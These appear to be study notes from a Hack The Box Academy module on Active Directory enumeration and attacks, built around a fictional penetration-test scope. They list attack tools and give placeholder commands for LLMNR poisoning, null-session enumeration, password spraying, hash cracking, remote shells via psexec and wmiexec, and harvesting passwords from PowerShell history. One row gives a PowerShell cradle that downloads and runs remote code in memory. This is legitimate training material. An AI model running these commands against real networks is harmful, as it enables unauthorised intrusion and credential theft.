# Active Directory Enumeration & Attacks

**Module Link**: https://academy.hackthebox.com/module/details/143

### Module Summary

This module introduces AD enumeration and attack techniques in modern and legacy enterprise environments. We will cover core principles  surrounding AD, Enumeration tools such as Bloodhound and Kerbrute, and  attack TTPs such as taking advantage of SMB Null sessions, Password  spraying, ACL attacks, attacking domain trusts, and more.

In this module, we will cover:

- Foundational AD knowledge
- AD enumeration principles
- External Reconnaissance
- Internal enumeration and footprinting
- Lateral movement
- Enumerating and Exploiting Trusts
- Password spraying
- LLNNR/NBT-NS Poisoning
- Gaining privileged access
- Using native tools to perform actions
- Kerberoasting
- Performing ACL Attacks
- AD hardening principles

## Active Directory Explained

`Active Directory` (`AD`) is a directory  service for Windows enterprise environments that was officially  implemented in 2000 with the release of Windows Server 2000 and has been incrementally improved upon with the release of each subsequent server  OS since. AD is based on the protocols x.500 and LDAP that came before  it and still utilizes these protocols in some form today. It is a  distributed, hierarchical structure that allows for centralized  management of an organization’s resources, including users, computers,  groups, network devices and file shares, group policies, devices, and  trusts. AD provides `authentication, accounting, and authorization` functions within a Windows enterprise environment. If this is your  first time learning about Active Directory or hearing these terms, check out the [Intro To Active Directory](https://academy.hackthebox.com/catalogue) module for a more in-depth look at the structure and function of AD, AD objects, etc.

------

## Why Should We Care About AD?

At the time of writing this module, Microsoft Active Directory holds around `43%` of the [market share](https://www.slintel.com/tech/identity-and-access-management/microsoft-active-directory-market-share#faqs) for enterprise organizations utilizing `Identity and Access management` solutions. This is a huge portion of the market, and it isn't likely to go anywhere any time soon since Microsoft is improving and blending  implementations with Azure AD. Another interesting stat to consider is  that just in the last two years, Microsoft has had over `2000` reported vulnerabilities tied to a [CVE](https://www.cvedetails.com/vendor/26/Microsoft.html). AD's many services and main purpose of making information easy to find  and access make it a bit of a behemoth to manage and correctly harden.  This exposes enterprises to vulnerabilities and exploitation from simple misconfigurations of services and permissions. Tie these  misconfigurations and ease of access with common user and OS  vulnerabilities, and you have a perfect storm for an attacker to take  advantage of. With all of this in mind, this module will explore some of these common issues and show us how to identify, enumerate, and take  advantage of their existence. We will practice enumerating AD utilizing  native tools and languages such as `Sysinternals`, `WMI`, `DNS`, and many others. Some attacks we will also practice include `Password spraying`, `Kerberoasting`, utilizing tools such as `Responder`, `Kerbrute`, `Bloodhound`, and much more.

We may often find ourselves in a network with no clear path to a  foothold through a remote exploit such as a vulnerable application or  service. Yet, we are within an Active Directory environment, which can  lead to a foothold in many ways. The general goal of gaining a foothold  in a client's AD environment is to `escalate privileges` by  moving laterally or vertically throughout the network until we  accomplish the intent of the assessment. The goal can vary from client  to client. It may be accessing a specific host, user's email inbox,  database, or just complete domain compromise and looking for every  possible path to Domain Admin level access within the testing period.  Many open-source tools are available to facilitate enumerating and  attacking Active Directory. To be most effective, we must understand how to perform as much of this enumeration manually as possible. More  importantly, we need to understand the "why" behind certain flaws and  misconfigurations. This will make us more effective as attackers and  equip us to give sound recommendations to our clients on the major  issues within their environment, as well as clear and actionable  remediation advice.

We need to be comfortable enumerating and attacking AD from both  Windows and Linux, with a limited toolset or built-in Windows tools,  also known as "`living off the land`." It is common to run  into situations where our tools fail, are being blocked, or we are  conducting an assessment where the client has us work from a `managed workstation` or `VDI instance` instead of the customized Linux or Windows attack host we may have  grown accustomed to. To be effective in all situations, we must be able  to adapt quickly on the fly, understand the many nuances of AD and know  how to access them even when severely limited in our options.

# Tools of the Trade

------

Many of the module sections require tools such as open-source scripts or precompiled binaries. These can be found in the `C:\Tools` directory on the Windows hosts provided in the sections aimed at  attacking from Windows. In sections that focus on attacking AD from  Linux, we provide a Parrot Linux host customized for the target  environment as if you were an anonymous user with an attack host within  the internal network. All necessary tools and scripts are preloaded on  this host (either installed or in the `/opt` directory).  Here is a listing of many of the tools that we will cover in this module:

| Tool                                                         | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain  situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and  SharpView can help us gather much of the data that BloodHound does, but  it requires more work to make meaningful relationships among all of the  data points. These tools are great for checking what additional access  we may have with a new set of credentials, targeting specific users or  computers, or finding some "quick wins" such as users that can be  attacked via Kerberoasting or ASREPRoasting. |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound)     | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment. |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) | The C# data collector to gather information from Active Directory  about varying AD objects such as users, groups, computers, ACLs, GPOs,  user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for  analysis. |
| [BloodHound.py](https://github.com/fox-it/BloodHound.py)     | A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a  non-domain joined attack host. The output can be ingested into the  BloodHound GUI for analysis. |
| [Kerbrute](https://github.com/ropnop/kerbrute)               | A tool written in Go that uses Kerberos Pre-Authentication to  enumerate Active Directory accounts, perform password spraying, and  brute-forcing. |
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket) | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating  and attacking Active Directory. |
| [Responder](https://github.com/lgandx/Responder)             | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. |
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. |
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh) | The C# version of Inveigh with a semi-interactive console for  interacting with captured data such as username and password hashes. |
| [rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo) | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command  "rpcinfo -p 10.0.0.1" will return a list of all the RPC services  available on the remote host, along with their program number, version  number, and protocol. Note that this command must be run with sufficient privileges. |
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote  RPC service. |
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec) | CME is an enumeration, attack, and post-exploitation toolkit which  can help us greatly in enumeration and performing attacks with the data  we gather. CME attempts to "live off the land" and abuse built-in AD  features and protocols like SMB, WMI, WinRM, and MSSQL. |
| [Rubeus](https://github.com/GhostPack/Rubeus)                | Rubeus is a C# tool built for Kerberos Abuse.                |
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) | Another Impacket module geared towards finding Service Principal names tied to normal users. |
| [Hashcat](https://hashcat.net/hashcat/)                      | A great hash cracking and password recovery tool.            |
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)  | A tool for enumerating information from Windows and Samba systems. |
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)      | A rework of the original Enum4linux tool that works a bit differently. |
| [ldapsearch](https://linux.die.net/man/1/ldapsearch)         | Built-in interface for interacting with the LDAP protocol.   |
| [windapsearch](https://github.com/ropnop/windapsearch)       | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. |
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray) | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. |
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)     | The toolkit includes functions written in PowerShell that leverage  PowerView to audit and attack Active Directory environments that have  deployed Microsoft's Local Administrator Password Solution (LAPS). |
| [smbmap](https://github.com/ShawnDEvans/smbmap)              | SMB share enumeration across a domain.                       |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell. |
| [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) | Part of the Impacket toolkit, it provides the capability of command execution over WMI. |
| [Snaffler](https://github.com/SnaffCon/Snaffler)             | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. |
| [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. |
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. |
| [Mimikatz](https://github.com/ParrotSec/mimikatz)            | Performs many functions. Notably, pass-the-hash attacks, extracting  plaintext passwords, and Kerberos ticket extraction from memory on a  host. |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) | Remotely dump SAM and LSA secrets from a host.               |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm)      | Provides us with an interactive shell on a host over the WinRM protocol. |
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases. |
| [noPac.py](https://github.com/Ridter/noPac)                  | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. |
| [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) | Part of the Impacket toolset, RPC endpoint mapper.           |
| [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py) | Printnightmare PoC in python.                                |
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) | Part of the Impacket toolset, it performs SMB relay attacks. |
| [PetitPotam.py](https://github.com/topotam/PetitPotam)       | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate  to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. |
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) | Tool for manipulating certificates and TGTs.                 |
| [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) | This tool will use an existing TGT to request a PAC for the current user using U2U. |
| [adidnsdump](https://github.com/dirkjanm/adidnsdump)         | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer. |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)       | Extracts usernames and passwords from Group Policy preferences files. |
| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) | Part of the Impacket toolkit. Used to perform the ASREPRoasting  attack to list and obtain AS-REP hashes for users with the 'Do not  require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking. |
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) | SID bruteforcing tool.                                       |
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) | A tool for creation and customization of TGT/TGS tickets. It can be  used for Golden Ticket creation, child to parent trust attacks, etc. |
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation. |
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) | Active Directory Explorer (AD Explorer) is an AD viewer and editor.  It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database  for offline analysis. When an AD snapshot is loaded, it can be explored  as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security  permissions. |
| [PingCastle](https://www.pingcastle.com/documentation/)      | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security). |
| [Group3r](https://github.com/Group3r/Group3r)                | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). |
| [ADRecon](https://github.com/adrecon/ADRecon)                | A tool used to extract various data from a target AD environment.  The data can be output in Microsoft Excel format with summary views and  analysis to assist with analysis and paint a picture of the  environment's overall security state. |

# Scenario

------

We are Penetration Testers working for `CAT-5 Security`.  After a few successful engagements shadowing with the team, the more  senior members want to see how well we can do starting an assessment on  our own. The team lead sent us the following email detailing what we  need to accomplish.

#### Tasking Email

![image](https://academy.hackthebox.com/storage/modules/143/scenario-email.png)

This module will allow us to practice our skills (both prior and  newly minted) with these tasks. The final assessment for this module is  the execution of `two` internal penetration tests against the company Inlanefreight. During these assessments, we will work through  an internal penetration test simulating starting from an external breach position and a second one beginning with an attack box inside the  internal network as clients often request. Completing the skills  assessments signifies the successful completion of the tasks mentioned  in the scoping document and tasking email above. In doing so, we will  demonstrate a firm grasp of many automated and manual AD attack and  enumeration concepts, knowledge of and experience with a wide array of  tools, and the ability to interpret data gathered from an AD environment to make critical decisions to advance the assessment. The content in  this module is meant to cover core enumeration concepts necessary for  anyone to be successful in performing internal penetration tests in  Active Directory environments. We will also cover many of the most  common attack techniques in great depth while working through some more  advanced concepts as a primer for AD-focused material that will be  covered in more advanced modules.

Below you will find a completed scoping document for the engagement  containing all pertinent information provided by the customer.

------

## Assessment Scope

The following `IPs`, `hosts`, and `domains` defined below make up the scope of the assessment.

#### In Scope For Assessment

| **Range/Domain**                | **Description**                                              |
| ------------------------------- | ------------------------------------------------------------ |
| `INLANEFREIGHT.LOCAL`           | Customer domain to include AD and web services.              |
| `LOGISTICS.INLANEFREIGHT.LOCAL` | Customer subdomain                                           |
| `FREIGHTLOGISTICS.LOCAL`        | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
| `172.16.5.0/23`                 | In-scope internal subnet.                                    |
|                                 |                                                              |

#### Out Of Scope

- `Any other subdomains of INLANEFREIGHT.LOCAL`
- `Any subdomains of FREIGHTLOGISTICS.LOCAL`
- `Any phishing or social engineering attacks`
- `Any other IPS/domains/subdomains not explicitly mentioned`
- `Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module`

------

## Methods Used

The following methods are authorized for assessing Inlanefreight and its systems :

### External Information Gathering (Passive Checks)

External information gathering is authorized to demonstrate the risks associated with information that can be gathered about the company from the internet. To simulate a real-world attack, CAT-5 and its assessors  will conduct external information gathering from an anonymous  perspective on the internet with no information provided in advance  regarding Inlanefreight outside of what is provided within this  document.

Cat-5 will perform passive enumeration to uncover information that  may help with internal testing. Testing will employ various degrees of  information gathering from open-source resources to identify publicly  accessible data that may pose a risk to Inlanefreight and assist with  the internal penetration test. No active enumeration, port scans, or  attacks will be performed against internet-facing "real-world" IP  addresses or the website located at `https://www.inlanefreight.com`.

### Internal Testing

The internal assessment portion is designed to demonstrate the risks  associated with vulnerabilities on internal hosts and services ( `Active Directory specifically`) by attempting to emulate attack vectors from within Inlanefreight's  area of operations. The result will allow Inlanefreight to assess the  risks of internal vulnerabilities and the potential impact of a  successfully exploited vulnerability.

To simulate a real-world attack, Cat-5 will conduct the assessment  from an untrusted insider perspective with no advance information  outside of what's provided in this documentation and discovered from  external testing. Testing will start from an anonymous position on the  internal network with the goal of obtaining domain user credentials,  enumerating the internal domain, gaining a foothold, and moving  laterally and vertically to achieve compromise of all in-scope internal  domains. Computer systems and network operations will not be  intentionally interrupted during the test.

### Password Testing

Password files captured from Inlanefreight devices, or provided by  the organization, may be loaded onto offline workstations for decryption and utilized to gain further access and accomplish the assessment  goals. At no time will a captured password file or the decrypted  passwords be revealed to persons not officially participating in the  assessment. All data will be stored securely on Cat-5 owned and approved systems and retained for a period of time defined in the official  contract between Cat-5 and Inlanefreight.

------

We provided the above scoping documentation so  we become used to seeing this style of documentation. As we progress  through our Infosec Careers, especially on the offensive side, it will  be common to receive scoping documents and Rules of Engagement (RoE)  documents that outline these types of information. 

------

## The Stage Is Set

Now that we have our scope clearly defined for this module, we can  dive into exploring Active Directory enumeration and attack vectors.  Now, let's dive into performing passive external enumeration against  Inlanefreight.

# External Recon and Enumeration Principles

**Tools:**

- https://bgp.he.net/
- https://viewdns.info/
- Nslookup
- Google Dorks

# Initial Enumeration of the Domain

**Tools:**

- Wireshark
- Tcpdump
- Responder
- fping
- Nmap
- kerbrute

**Commands:**

Responder:

```bash
sudo responder -I {INTERFACE} -A
```

fping:

```bash
fping -asgq {IP RANGE}
```

Nmap:

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

kerbrute:

```bash
kerbrute userenum -d {DOMAIN} --dc {DC IP} {WORDLIST} -o valid_ad_users
```

# Sniffing out a Foothold

## LLMNR/NBT-NS Poisoning - from Linux

**Tools:**

- responder
- hashcat
- john
- Inveigh
- Metasploit

**Commands:**

hashcat:

```bash
hashcat -m {Mode Number} {File} {Wordlist}
Example: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Note:** Mode list --> https://hashcat.net/wiki/doku.php?id=example_hashes

## LLMNR/NBT-NS Poisoning - from Windows

**Tools:**

- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

**Commands:**

xfreerdp:

```bash
xfreerdp /u:'{USER}' /p:'{PASS}' /v:{IP}
Example: xfreerdp /u:'htb-student' /p:'Academy_student_AD!' /v:10.129.180.243
```

Inveigh.ps1 - OUTDATED:

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
Example: Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Inveigh.exe:

```powershell
.\Inveigh.exe
```

# Sighting In, Hunting For A User

## Enumerating & Retrieving Password Policies

**Tools:**

- CrackMapExec
- NetExec
- rpcclient
- enum4linux
- enum4linux-ng
- windapsearch
- ldapsearch
- ldapdomaindump
- PowerView.ps1
- smbclient
- net.exe

**Commands - From Linux:**

crackmapexec:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --pass-pol
```

rpcclient - Null session:

```bash
rpcclient -U "" -N {IP}

rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

enum4linux:

```bash
enum4linux -P {IP}
```

ldapsearch:

```bash
ldapsearch -h {IP} -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

**Commands - From Windows:**

net.exe:

```cmd
net accounts
```

Powerview:

```powershell
Get-DomainPolicy
```

## Password Spraying - Making a Target User List

**Tools:**

- kerbrute
- Responder
- crackmapexec
- windapsearch
- ldapsearch
- enum4linux
- linkedin2username

**Commands:**

enum4linux - without creds:

```bash
enum4linux -U {IP}  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

rpcclient - null login:

```bash
rpcclient -U "" -N {IP}

rpcclient $> enumdomusers
```

crackmapexec - without creds: 

```bash
crackmapexec smb {IP} --users
```

ldapsearch - without creds:

```bash
ldapsearch -h {IP} -x -b "DC={DOMAIN},DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

windapsearch - without creds:

```
windapsearch.py --dc-ip {IP} -u "" -U
```

kerbrute:

```bash
kerbrute userenum -d {DOMAIN} --dc {IP} {WORDLIST}
```

crackmapexec - with creds:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --users
```

# Spray Responsibly

## Internal Password Spraying - from Linux

**Tools:**

- kerbrute
- rpcclient
- crackmapexec

**Commands:**

rpcclient - one liner:

```bash
for u in $(cat {WORDLIST});do rpcclient -U "$u%{PASS}" -c "getusername;quit" {IP} | grep Authority; done
```

kerbrute:

```bash
kerbrute passwordspray -d {DOMAIN} --dc {IP} {WORDLIST} {PASS}
```

crackmapexec: 

```bash
crackmapexec smb {IP} -u {WORDLIST} -p {PASS} --continue-on-success
```

## Internal Password Spraying - from Windows

**Tools:**

- DomainPasswordSpray

**Commands:**

DomainPasswordSpray - host domain-joined:

```powershell
Invoke-DomainPasswordSpray -Password {PASS} -OutFile {FILE_NAME} -ErrorAction SilentlyContinue
```

# Deeper Down the Rabbit Hole

## Enumerating Security Controls

**Tools:**

- [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)

**Commands:**

Get-MpComputerStatus - Checking the Status of Defender:

```powershell
Get-MpComputerStatus
```

Get-AppLockerPolicy:

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

PowerShell Constrained Language Mode Enumeration:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Find-LAPSDelegatedGroups:

```powershell
Find-LAPSDelegatedGroups
```

Find-AdmPwdExtendedRights (checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All  Extended Rights" can read LAPS passwords and may be less protected than  users in delegated groups, so this is worth checking for.):

```powershell
Find-AdmPwdExtendedRights
```

Get-LAPSComputers (search for computers that have LAPS enabled when passwords expire, and  even the randomized passwords in cleartext if our user has access.):

```powershell
Get-LAPSComputers
```

## Credentialed Enumeration - from Linux

**Tools:**

- Crackmapexec
- SMBmap
- rpcclient
- wmiexec
- psexec
- windapsearch
- bloodhound

**Commands:**

CME - Domain User Enumeration:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --users
```

CME - Domain Group Enumeration:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --groups
```

CME - Logged On Users:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --loggedon-users
```

CME - Share Searching:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --shares
```

SMBmap:

```bash
smbmap -u {USER} -p {PASS} -d {DOMAIN} -H {IP}
```

rpcclient - Null Session:

```bash
rpcclient -U "" -N {IP}
```

psexec:

```bash
psexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}  
```

wmiexec:

```bash
wmiexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}  
```

windapsearch - Enumerate Domain Admins:

```bash
windapsearch.py --dc-ip {IP} -u {USER}@{DOMAIN} -p {PASS} --da
```

windapsearch - Privileged Users:

```bash
windapsearch.py --dc-ip {IP} -u {USER}@{DOMAIN} -p {PASS} -PU
```

## Credentialed Enumeration - from Windows

**Tools:**

- [Active Directory Powershell Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- SharpView.exe
- [Snaffler](https://github.com/SnaffCon/Snaffler)
- BloodHound
- SharpHound

**Commands:**

Get-Module (Discover Modules):

```powershell
Get-Module
```

Load ActiveDirectory Module:

```powershell
Import-Module ActiveDirectory
```

Get-ADDomain (Get Domain Info):

```powershell
Get-ADDomain
```

Get-ADUser (Get AD users):

**NOTE:** We will be filtering for accounts with the `ServicePrincipalName` property populated.

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

 Get-ADTrust (verify domain trust relationships): 

```powershell
Get-ADTrust -Filter *
```

Get-ADGroup (Get AD Groups):

```powershell
Get-ADGroup -Filter * | select name
```

Get-ADGroup (Get detailed group info):

```powershell
Get-ADGroup -Identity "{GROUP}"
```

Get-ADGroupMember (Get group members):

```powershell
Get-ADGroupMember -Identity "{GROUP}"
```

Get-DomainUser (Get information on all users or specific users we specify):

```powershell
Get-DomainUser -Identity {USER} -Domain {DOMAIN} | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

Get-DomainUser - SPN (check for users with the SPN attribute set):

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

Get-DomainGroupMember (Get group members):

**NOTE:** Use `-Recurse` to do a recursive search.

```powershell
Get-DomainGroupMember -Identity "{GROUP}" -Recurse
```

Get-DomainTrustMapping (verify domain trust relationships):

```powershell
Get-DomainTrustMapping
```

Test-AdminAccess (function to test for local admin access on either the current machine or a remote one)

```powershell
Test-AdminAccess -ComputerName {COMPUTER}
```

SharpView.exe:

```powershell
SharpView.exe {FUNCTION} -Help
Example: .\SharpView.exe Get-DomainUser -Help
```

SharpView.exe - Get-DomainUser:

```powershell
SharpView.exe Get-DomainUser -Identity {USER}
```

Snaffler.exe:

```powershell
.\Snaffler.exe -s -d {DOMAIN} -o snaffler.log -v data
```

SharpHound.exe - No credentials:

```powershell
.\SharpHound.exe -c All --zipfilename bloodhound.zip
```

**PowerView - Most useful functions:**

| **Command**                         | **Description**                                              |
| ----------------------------------- | ------------------------------------------------------------ |
| `Export-PowerViewCSV `              | Append results to a CSV file                                 |
| `ConvertTo-SID`                     | Convert a User or group name to its SID value                |
| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account |
| **Domain/LDAP Functions:**          |                                                              |
| `Get-Domain`                        | Will return the AD object for the current (or specified) domain |
| `Get-DomainController`              | Return a list of the Domain Controllers for the specified domain |
| `Get-DomainUser`                    | Will return all users or specific user objects in AD         |
| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD |
| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD       |
| `Get-DomainOU`                      | Search for all or specific OU objects in AD                  |
| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects |
| `Get-DomainGroupMember `            | Will return the members of a specific domain group           |
| `Get-DomainFileServer `             | Returns a list of servers likely functioning as file servers |
| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain |
| **GPO Functions:**                  |                                                              |
| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD           |
| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain |
| **Computer Enumeration Functions:** |                                                              |
| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine     |
| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                 |
| `Get-NetShare `                     | Returns open shares on the local (or a remote) machine       |
| `Get-NetSession`                    | Will return session information for the local (or a remote) machine |
| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine |
| **Threaded 'Meta'-Functions:**      |                                                              |
| `Find-DomainUserLocation`           | Finds machines where specific users are logged in            |
| `Find-DomainShare`                  | Finds reachable shares on domain machines                    |
| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain |
| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access |
| **Domain Trust Functions:**         |                                                              |
| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain |
| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest |
| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain |
| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen. |

## Living Off the Land

**Commands:**

systeminfo:

```cmd
systeminfo
```

Powershell.exe - Downgrade:

```powershell
powershell.exe -version 2
```

netsh - Firewall Checks:

```powershell
netsh advfirewall show allprofiles
```

sc query - Windows Defender Check:

```cmd
sc query windefend
```

Get-MpComputerStatus - Windows Defender Check:

```powershell
Get-MpComputerStatus
```

qwinsta - Check users logged in:

```cmd
qwinsta
```

dsquery - User Search:

```powershell
dsquery user
```

dsquery - Computer Search:

```powershell
dsquery computer
```

#### Basic Enumeration Commands

| **Command**                                             | **Result**                                                   |
| ------------------------------------------------------- | ------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                         |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                 |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host          |
| `ipconfig /all`                                         | Prints out network adapter state and configurations          |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt) |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt) |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
| `systmeinfo`                                            | Print a summary of the host's information                    |

#### Harnessing PowerShell

| **Cmd-Let**                                                  | **Description**                                              |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-Module`                                                 | Lists available modules loaded for use.                      |
| `Get-ExecutionPolicy -List`                                  | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process`                  | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process  or terminate it. This is ideal because we won't be making a permanent  change to the victim host. |
| `Get-ChildItem Env: | ft Key,Value`                          | Return environment values such as key paths, users, computer information, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | With this string, we can get the specified user's PowerShell  history. This can be quite helpful as the command history may contain  passwords or point us towards configuration files or scripts that  contain passwords. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

#### Network Information

| **Networking Commands**              | **Description**                                              |
| ------------------------------------ | ------------------------------------------------------------ |
| `arp -a `                            | Lists all known hosts stored in the arp table.               |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here. |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
